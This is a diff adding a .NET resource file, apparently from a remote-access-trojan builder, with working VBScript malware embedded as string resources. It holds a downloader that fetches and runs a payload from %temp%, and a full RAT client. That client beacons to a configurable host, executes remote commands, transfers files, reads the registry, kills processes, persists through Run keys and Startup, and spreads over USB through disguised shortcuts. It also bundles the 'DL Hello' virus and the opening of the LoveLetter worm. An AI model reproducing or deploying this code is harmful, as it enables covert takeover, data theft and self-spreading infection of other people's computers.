@@ -1,0 +1,1730 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="DW" xml:space="preserve">
+    <value>On Error Resume Next
+Dim sh 
+Randomize
+Set sh = WScript.CreateObject("WScript.Shell")
+HTTPDownload "#1", sh.ExpandEnvironmentStrings("%temp%" &amp; "\#2.#3")
+Sub HTTPDownload( myURL, myPath )
+    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
+    Const ForReading = 1, ForWriting = 2, ForAppending = 8
+    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
+    If objFSO.FolderExists( myPath ) Then
+        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
+    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
+        strFile = myPath
+    Else
+        WScript.Echo "ERROR: Target folder not found."
+        Exit Sub
+    End If
+    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
+    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
+    objHTTP.Open "GET", myURL, False
+    objHTTP.Send
+    For i = 1 To LenB( objHTTP.ResponseBody )
+        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
+    Next
+    objFile.Close( )
+End Sub
+Set wshShell = WScript.CreateObject ("WSCript.shell")
+wshshell.run  sh.ExpandEnvironmentStrings("%temp%" &amp; "\#2.#3"), 6, True
+set wshshell = nothing</value>
+  </data>
+  <data name="Config2" xml:space="preserve">
+    <value>'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+host = "%HOST%"
+port = %PORT%
+installdir = "%temp%"
+lnkfile = %LF%
+lnkfolder = %LFO%
+'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=
+dim DJB 
+dim shellobj 
+set shellobj = wscript.createobject("wscript.shell")
+dim filesystemobj
+set filesystemobj = createobject("scripting.filesystemobject")
+dim httpobj
+set httpobj = createobject("msxml2.xmlhttp")
+installname = wscript.scriptname
+startup = shellobj.specialfolders ("startup") &amp; "\"
+installdir = shellobj.expandenvironmentstrings(installdir) &amp; "\"
+if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") &amp; "\"
+spliter = "qiQqi"
+sleep = 250 
+dim response
+dim cmd
+dim param
+info = ""
+usbspreading = "False"
+startdate = ""
+dim oneonce
+dim reg_key1
+'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
+on error resume next
+instance
+while true
+install
+response = ""
+response = post ("ready","")
+cmd = split (response,spliter)
+select case cmd (0)
+case "exc"
+      param = cmd (1)
+      execute param
+case "uns"
+      uninstall
+case  "sleep"
+      param = cmd (1)
+      sleep = eval (param)  
+case  "msg"
+	  param = cmd (1)
+	  MsgBox param
+case "open_fm"
+	 response = post ("open_fm","open_fm" &amp; spliter)
+case "fm_drives"
+	 response = post ("fm_drives","fm_drives" &amp; spliter &amp; enumdriver() &amp; spliter)
+case "fm_browse"
+	dim All_faf
+	dim dir_req
+	dir_req =  cmd (1)
+	All_faf = enumfaf (dir_req)
+	 response = post ("fm_browse","fm_browse" &amp; spliter &amp; All_faf &amp; spliter)
+case "open_proc"
+	 response = post ("open_proc","open_proc" &amp; spliter)
+case "get_proc"
+	dim All_proc
+	All_proc = enumprocess()
+	 response = post ("get_proc","get_proc" &amp; spliter &amp; All_proc &amp; spliter)
+case "kill_pro"  
+	param = cmd(1)
+    exitprocess param
+case "open_cmd"
+	response = post ("open_cmd","open_cmd" &amp; spliter &amp; cmdshell("") &amp; spliter)
+case "prc_cmd"
+	param = cmd(1)
+	dim res_cmd
+	res_cmd = cmdshell(param)
+	response = post ("resp_cmd","resp_cmd" &amp; spliter &amp; res_cmd &amp; spliter)
+case "open_reg"
+	 response = post ("open_reg","open_reg" &amp; spliter)
+case "get_reg"
+	dim All_reg
+	dim reg_Main
+	dim ky_PH
+	reg_Main =  cmd (1)
+	ky_PH =   cmd (2)
+	 All_reg = GET_KEys(reg_Main,ky_PH)
+	 response = post ("get_reg","get_reg" &amp; spliter &amp; All_reg &amp; spliter )
+case "run_fil"
+		dim Val_file
+		param = cmd(1)
+		   Dim shl  
+		Set shl = CreateObject("Wscript.Shell")  
+		Val_file = param 
+		Call shl.Run(""""&amp; Val_file &amp; """")  
+        Set shl = Nothing    
+case "sen_me_fil"
+		
+		param = cmd(1)
+		dim file_nme
+		file_nme = cmd(2)
+		dim Val_UP
+		Val_UP = ReadBinaryFile (param)
+		 
+		 response = post ("dwn_this" &amp; spliter &amp; file_nme &amp; spliter, Val_UP )
+		
+case "sendfileto"
+	   dim write_file_to 
+	   write_file_to = cmd(1) 'Dir to write file to with filename "Dir\file.ext"
+	   dim write_content
+	   write_content = cmd(2)
+	   dim Val_DW
+	   dim fil_cont_w
+	   fil_cont_w = decodeBase64 (write_content)
+	   Val_DW = SaveBinaryData (write_file_to,fil_cont_w)
+	   
+	   
+case "del_file"
+		dim del_file_fro 
+	   del_file_fro = cmd(1)
+	   deletefaf del_file_fro
+case "ren_file"
+	   dim ren_file_fro 
+	   ren_file_fro = cmd(1)
+	   dim new_name_file
+	   new_name_file = cmd(2)
+	   rename_filefaf ren_file_fro,new_name_file
+	   
+case "ren_folder"
+	   dim ren_folder_fro 
+	   ren_folder_fro = cmd(1)
+	   dim new_name_folder
+	   new_name_folder = cmd(2)
+	   rename_folderfaf ren_folder_fro,new_name_folder 
+	   
+case "create_fold"
+		 dim cre_folder_fro 
+	   cre_folder_fro = cmd(1)
+	   Create_folde cre_folder_fro
+case "open_rem_vrus" 
+	   response = post ("open_rem_vrus","open_rem_vrus" &amp; spliter)	   
+	   
+end select
+wscript.sleep sleep
+wend
+sub Create_folde(folde_nam1)
+ On Error Resume Next
+filesystemobj.CreateFolder folde_nam1
+end sub 
+Sub rename_folderfaf(folder_n1 , folder_n2 )
+ On Error Resume Next
+	filesystemobj.MoveFolder folder_n1 , folder_n2
+End Sub
+Sub rename_filefaf(file_n1 , file_n2 )
+    On Error Resume Next
+    filesystemobj.MoveFile file_n1 , file_n2
+End Sub
+Sub deletefaf(file_ur)
+        On Error Resume Next
+		filesystemobj.deletefile(file_ur)
+        filesystemobj.deletefolder(file_ur)
+
+End Sub
+private function decodeBase64(base64)
+  dim DM, EL
+  Set DM = CreateObject("Microsoft.XMLDOM")
+  ' Create temporary node with Base64 data type
+  Set EL = DM.createElement("tmp")
+  EL.DataType = "bin.base64"
+  ' Set encoded String, get bytes
+  EL.Text = base64
+  decodeBase64 = EL.NodeTypedValue
+end function
+ 
+Function SaveBinaryData(FileName, ByteArray)
+  Const adTypeBinary = 1
+  Const adSaveCreateOverWrite = 2
+  
+  'Create Stream object
+  Dim BinaryStream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  
+  'Specify stream type - we want To save binary data.
+  BinaryStream.Type = adTypeBinary
+  
+  'Open the stream And write binary data To the object
+  BinaryStream.Open
+  BinaryStream.Write ByteArray
+  
+  'Save binary data To disk
+  BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
+End Function
+
+Function ReadBinaryFile(FileName)
+  Const adTypeBinary = 1
+  
+  'Create Stream object
+  Dim BinaryStream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  
+  'Specify stream type - we want To get binary data.
+  BinaryStream.Type = adTypeBinary
+  
+  'Open the stream
+  BinaryStream.Open
+  
+  'Load the file data from disk To stream object
+  BinaryStream.LoadFromFile FileName
+  
+  'Open the stream And get binary data from the object
+  ReadBinaryFile = BinaryStream.Read
+End Function
+Function upload(fileurl)
+
+        Dim objstreamuploade, buffer
+        objstreamuploade = CreateObject("adodb.stream")
+        With objstreamuploade
+            .type = 1
+            .open()
+            .loadfromfile(fileurl)
+            buffer = .read
+            .close()
+        End With
+        objstreamdownload = Nothing
+		 
+		'dim httpobj
+        'httpobj = CreateObject("msxml2.xmlhttp")
+        'httpobj.open "post", "http://" &amp; host &amp; ":" &amp; port &amp; "/" &amp; "is-recving" &amp; spliter &amp; fileurl, false
+		'httpobj.send "dwn_this"&amp; spliter &amp; buffer
+		upload = buffer
+End Function
+
+
+
+
+
+
+
+Function cmdshell(cmd_com)
+
+Dim ObjExec
+Dim strFromProc
+ 
+Set objShell = WScript.CreateObject("WScript.Shell")
+Set ObjExec = objShell.Exec("cmd.exe /c " &amp; cmd_com)
+Do
+    strFromProc = strFromProc &amp; vbCrLf  &amp; ObjExec.StdOut.ReadLine()
+Loop While Not ObjExec.Stdout.atEndOfStream
+
+        cmdshell = strFromProc
+		
+    End Function
+
+
+
+function Read_Reg_V(reg_read)
+reg_read = Replace(reg_read,"\\","\")
+Set objShell = WScript.CreateObject("WScript.Shell")
+Read_Reg_V = objShell.RegRead(reg_read) 
+end function
+
+function GET_KEys(reg_key,key_path_entry)
+ on error resume next
+dim strComputer
+dim All_KS
+dim ALL_VLS
+Const HKEY_CLASSES_ROOT = &amp;H80000000
+Const HKEY_CURRENT_USER = &amp;H80000001
+Const HKEY_LOCAL_MACHINE = &amp;H80000002
+Const HKEY_USERS = &amp;H80000003
+Const HKEY_CURRENT_CONFIG = &amp;H80000005
+
+dim Key_INT32 
+select case reg_key
+	case "HKEY_CLASSES_ROOT"
+	Key_INT32 = HKEY_CLASSES_ROOT
+	case "HKEY_CURRENT_USER"
+	Key_INT32 = HKEY_CURRENT_USER
+	case "HKEY_LOCAL_MACHINE"
+	Key_INT32 = HKEY_LOCAL_MACHINE
+	case "HKEY_USERS"
+	Key_INT32 = HKEY_USERS
+	case "HKEY_CURRENT_CONFIG"
+	Key_INT32 = HKEY_CURRENT_CONFIG
+end select
+strComputer = "."
+
+Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _ 
+    &amp; strComputer &amp; "\root\default:StdRegProv")
+
+strKeyPath = key_path_entry
+
+objReg.EnumKey Key_INT32, strKeyPath, arrSubKeys
+
+For Each subkey In arrSubKeys
+	All_KS = All_KS &amp; subkey &amp; "|l_ln|"
+	objReg.EnumValues Key_INT32, strKeyPath , sNames , Types
+	Dim i 
+	i = 0
+	For each xx in sNames
+		dim full_ke_path 
+		full_ke_path = reg_key &amp; "\" &amp;  key_path_entry  &amp; "\" &amp; xx
+		dim Val_read
+		Val_read = Read_Reg_V(full_ke_path)
+		If Val_read &lt;&gt; "" Then 
+		'String is Not Null And Not Empty, code goes here
+		Else
+		
+		End If
+		ALL_VLS = ALL_VLS &amp; xx  &amp;   "#$"   &amp;  Types(i) &amp;   "#$"   &amp; Val_read &amp; "|vsl_n|"
+			  
+	i = i + 1
+	Next 
+		 
+Next
+GET_KEys = All_KS  &amp; "R#_$PL"  &amp; ALL_VLS &amp; "R#_$PL" 
+end function
+
+sub install
+on error resume next
+dim lnkobj
+dim filename
+dim foldername
+dim fileicon
+dim foldericon
+upstart
+for each drive in filesystemobj.drives
+if  drive.isready = true then
+if  drive.freespace  &gt; 0 then
+if  drive.drivetype  = 1 then
+    filesystemobj.copyfile wscript.scriptfullname , drive.path &amp; "\" &amp; installname,true
+    if  filesystemobj.fileexists (drive.path &amp; "\" &amp; installname)  then
+        filesystemobj.getfile(drive.path &amp; "\"  &amp; installname).attributes = 2+4
+    end if
+    for each file in filesystemobj.getfolder( drive.path &amp; "\" ).Files
+        if not lnkfile then exit for
+        if  instr (file.name,".") then
+            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) &lt;&gt; "lnk" then
+                file.attributes = 2+4
+                if  ucase (file.name) &lt;&gt; ucase (installname) then
+                    filename = split(file.name,".")
+                    set lnkobj = shellobj.createshortcut (drive.path &amp; "\"  &amp; filename (0) &amp; ".lnk") 
+                    lnkobj.windowstyle = 7
+                    lnkobj.targetpath = "cmd.exe"
+                    lnkobj.workingdirectory = ""
+                    lnkobj.arguments = "/c start " &amp; replace(installname," ", chrw(34) &amp; " " &amp; chrw(34)) &amp; "&amp;start " &amp; replace(file.name," ", chrw(34) &amp; " " &amp; chrw(34)) &amp;"&amp;exit"
+                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" &amp; shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." &amp; split(file.name, ".")(ubound(split(file.name, ".")))&amp; "\") &amp; "\defaulticon\") 
+                    if  instr (fileicon,",") = 0 then
+                        lnkobj.iconlocation = file.path
+                    else 
+                        lnkobj.iconlocation = fileicon
+                    end if
+                    lnkobj.save()
+                end if
+            end if
+        end if
+    next
+    for each folder in filesystemobj.getfolder( drive.path &amp; "\" ).subfolders
+        if not lnkfolder then exit for
+        folder.attributes = 2+4
+        foldername = folder.name
+        set lnkobj = shellobj.createshortcut (drive.path &amp; "\"  &amp; foldername &amp; ".lnk") 
+        lnkobj.windowstyle = 7
+        lnkobj.targetpath = "cmd.exe"
+        lnkobj.workingdirectory = ""
+        lnkobj.arguments = "/c start " &amp; replace(installname," ", chrw(34) &amp; " " &amp; chrw(34)) &amp; "&amp;start explorer " &amp; replace(folder.name," ", chrw(34) &amp; " " &amp; chrw(34)) &amp;"&amp;exit"
+        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
+        if  instr (foldericon,",") = 0 then
+            lnkobj.iconlocation = folder.path
+        else 
+            lnkobj.iconlocation = foldericon
+        end if
+        lnkobj.save()
+    next
+end If
+end If
+end if
+next
+err.clear
+end sub
+sub uninstall
+on error resume next
+dim filename
+dim foldername
+shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
+shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
+filesystemobj.deletefile startup &amp; installname ,true
+filesystemobj.deletefile wscript.scriptfullname ,true
+for  each drive in filesystemobj.drives
+if  drive.isready = true then
+if  drive.freespace  &gt; 0 then
+if  drive.drivetype  = 1 then
+    for  each file in filesystemobj.getfolder ( drive.path &amp; "\").files
+         on error resume next
+         if  instr (file.name,".") then
+             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) &lt;&gt; "lnk" then
+                 file.attributes = 0
+                 if  ucase (file.name) &lt;&gt; ucase (installname) then
+                     filename = split(file.name,".")
+                     filesystemobj.deletefile (drive.path &amp; "\" &amp; filename(0) &amp; ".lnk" )
+                 else
+                     filesystemobj.deletefile (drive.path &amp; "\" &amp; file.name)
+                 end If
+             else
+                 filesystemobj.deletefile (file.path) 
+             end if
+         end if
+     next
+     for each folder in filesystemobj.getfolder( drive.path &amp; "\" ).subfolders
+         folder.attributes = 0
+     next
+end if
+end if
+end if
+next
+wscript.quit
+end sub
+function post (cmd ,param)
+post = param
+httpobj.open "POST","http://" &amp; host &amp; ":" &amp; port &amp;"/" &amp; cmd, false
+httpobj.setrequestheader "User-Agent:",information
+httpobj.send param
+post = httpobj.responsetext
+end function
+function information
+on error resume next
+if  inf = "" then
+    inf = hwid &amp; spliter 
+    inf = inf  &amp; shellobj.expandenvironmentstrings("%computername%") &amp; spliter 
+    inf = inf  &amp; shellobj.expandenvironmentstrings("%username%") &amp; spliter
+    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+    set os = root.execquery ("select * from win32_operatingsystem")
+    for each osinfo in os
+       inf = inf &amp; osinfo.caption &amp; spliter  
+       exit for
+    next
+    inf = inf &amp; spliter &amp; "0.1" &amp; spliter &amp; security &amp; spliter &amp; usbspreading &amp; spliter
+    information = inf  
+else
+    information = inf
+end if
+end function
+sub upstart ()
+on error resume Next
+shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0),  "wscript.exe //B " &amp; chrw(34) &amp; installdir &amp; installname &amp; chrw(34) , "REG_SZ"
+shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0),  "wscript.exe //B "  &amp; chrw(34) &amp; installdir &amp; installname &amp; chrw(34) , "REG_SZ"
+filesystemobj.copyfile wscript.scriptfullname,installdir &amp; installname,true
+filesystemobj.copyfile wscript.scriptfullname,startup &amp; installname ,true
+end sub
+function hwid
+on error resume next
+set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+set disks = root.execquery ("select * from win32_logicaldisk")
+for each disk in disks
+    if  disk.volumeserialnumber &lt;&gt; "" then
+        hwid = disk.volumeserialnumber
+        exit for
+    end if
+next
+end function
+function security 
+on error resume next
+security = ""
+set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
+for each objitem in colitems
+    versionstr = split (objitem.version,".")
+next
+versionstr = split (colitems.version,".")
+osversion = versionstr (0) &amp; "."
+for  x = 1 to ubound (versionstr)
+	 osversion = osversion &amp;  versionstr (i)
+next
+osversion = eval (osversion)
+if  osversion &gt; 6 then sc = "securitycenter2" else sc = "securitycenter"
+set objsecuritycenter = getobject("winmgmts:\\localhost\root\" &amp; sc)
+Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
+for each objantivirus in colantivirus
+    security  = security  &amp; objantivirus.displayname &amp; " ."
+next
+if security  = "" then security  = "NAN/AV"
+end function
+function instance
+on error resume next
+usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" &amp; split (installname,".")(0) &amp; "\")
+if usbspreading = "" then
+   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &amp;  lcase(installname) then
+      usbspreading = "YES - " &amp; date
+      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp; split (installname,".")(0)  &amp; "\",  usbspreading, "REG_SZ"
+   else
+      usbspreading = "NO - " &amp; date
+      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp; split (installname,".")(0)  &amp; "\",  usbspreading, "REG_SZ"
+   end if
+end If
+upstart
+set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
+set installfullnameshort =  filesystemobj.getfile (installdir &amp; installname)
+if  lcase (scriptfullnameshort.shortpath) &lt;&gt; lcase (installfullnameshort.shortpath) then 
+    shellobj.run "wscript.exe //B " &amp; chr(34) &amp; installdir &amp; installname &amp; Chr(34)
+    wscript.quit 
+end If
+err.clear
+set oneonce = filesystemobj.opentextfile (installdir &amp; installname ,8, false)
+if  err.number &gt; 0 then wscript.quit
+end function
+ Function enumdriver()
+
+        For Each drive In filesystemobj.drives
+            enumdriver = enumdriver &amp; drive.path &amp; "|" &amp; drive.drivetype &amp; "drv_split"
+           Next
+    End Function
+	
+    Function enumfaf(enumdir)
+	dim AllFolders
+	dim AllFiles
+        'enumfaf = enumdir &amp; "gfm_split"
+        For Each folder In filesystemobj.getfolder(enumdir).subfolders
+            AllFolders = AllFolders &amp; folder.name &amp; "#!#" &amp; "N/A" &amp; "#!#" &amp; "dir" &amp;  "gfm_split"
+        Next
+
+        For Each file In filesystemobj.getfolder(enumdir).files
+            AllFiles = AllFiles &amp; file.name &amp; "#!#" &amp; file.size &amp; "#!#" &amp; "fil" &amp;  "gfm_split"
+
+        Next
+		enumfaf = AllFolders  &amp; AllFiles  
+    End Function
+ Function enumprocess()
+on error resume next
+	 
+Dim objWMIService, objProcess, colProcess
+Dim strComputer, strList
+
+strComputer = "."
+
+Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &amp; strComputer &amp; "\root\cimv2")
+
+Set colProcess = objWMIService.ExecQuery ("Select * from Win32_Process")
+
+For Each objProcess in colProcess
+
+    strList = strList &amp;  objProcess.Name &amp; "#" &amp; objProcess.processid  &amp; "#"  &amp; objProcess.executablepath  &amp; "PrO_SPL"
+
+Next
+enumprocess = strList
+    End Function
+    Sub exitprocess(pname)
+        On Error Resume Next
+		shellobj.run("TASKKILL /F /IM " &amp; pname)
+End Sub</value>
+  </data>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="unknowen" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\unknowen.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows10" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Windows10.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows7" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Windows7.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="WindowsXP" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\WindowsXP.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows_Vista" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Windows Vista.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="unknowen_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\unknowen-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows10_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Windows10-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows7_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Windows7-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="WindowsXP_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\WindowsXP-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Windows_Vista_infected" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Windows Vista-infected.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Dl_HELLOVIR" xml:space="preserve">
+    <value>rem - VBS/dlH "DL Hello" Virus - By D.L.
+rem - Written on November 12th, 2003
+
+On Error Resume Next 
+dim FSobj,orgMes,finalMes
+set FSobj=CreateObject("Scripting.FileSystemObject")
+
+orgMes="Hello! Don't be mad...I'm not a bad bug :) - by *|%|"
+orgMes=replace(orgMes,chr(42),chr(68))
+orgMes=replace(orgMes,chr(124),chr(46))
+finalMes=replace(orgMes,chr(37),chr(76))
+
+
+On Error Resume Next 
+dim drive,machine
+
+set machine=FSobj.Drives 
+for each drive in machine  
+ 	if (drive.DriveType=2)or(drive.DriveType=3) then 
+ 		indexFolders(drive.Path&amp;"\") 
+	end If 
+next 
+
+
+sub indexFolders(location) 
+	On Error Resume Next 
+	dim specs,file,subFol,sayHello
+
+	set specs=FSobj.GetFolder(location) 
+	set subFol=specs.SubFolders 
+
+	for each file in subFol 
+                set sayHello = FSobj.CreateTextFile(file.Path&amp;".hello", 2, True) 
+		sayHello.write finalMes 
+		sayHello.Close 
+		writeData(file.Path) 
+		indexFolders(file.Path) 
+	next 
+end sub 
+
+sub writeData(location)
+	On Error Resume Next 
+        dim folder,directory,file,sayHello
+
+	set folder=FSobj.GetFolder(location) 
+	set directory=folder.Files 
+
+	for each file in directory 
+ 		set sayHello = FSobj.CreateTextFile(file.Path&amp;".hello", 2, True) 
+		sayHello.write finalMes 
+		sayHello.Close  
+	next 
+end sub</value>
+  </data>
+  <data name="love_letter" xml:space="preserve">
+    <value>rem  barok -loveletter(vbe) &lt;i hate go to school&gt; 
+ rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines 
+ On Error Resume Next 
+ dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow 
+ eq="" 
+ ctr=0 
+ Set fso = CreateObject("Scripting.FileSystemObject") 
+ set file = fso.OpenTextFile(WScript.ScriptFullname,1) 
+ vbscopy=file.ReadAll 
+ main() 
+ sub main() 
+ On Error Resume Next 
+ dim wscr,rr 
+ set wscr=CreateObject("WScript.Shell") 
+ rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout") 
+ if (rr&gt;=1) then 
+ wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD" 
+ end if 
+ Set dirwin = fso.GetSpecialFolder(0) 
+ Set dirsystem = fso.GetSpecialFolder(1) 
+ Set dirtemp = fso.GetSpecialFolder(2) 
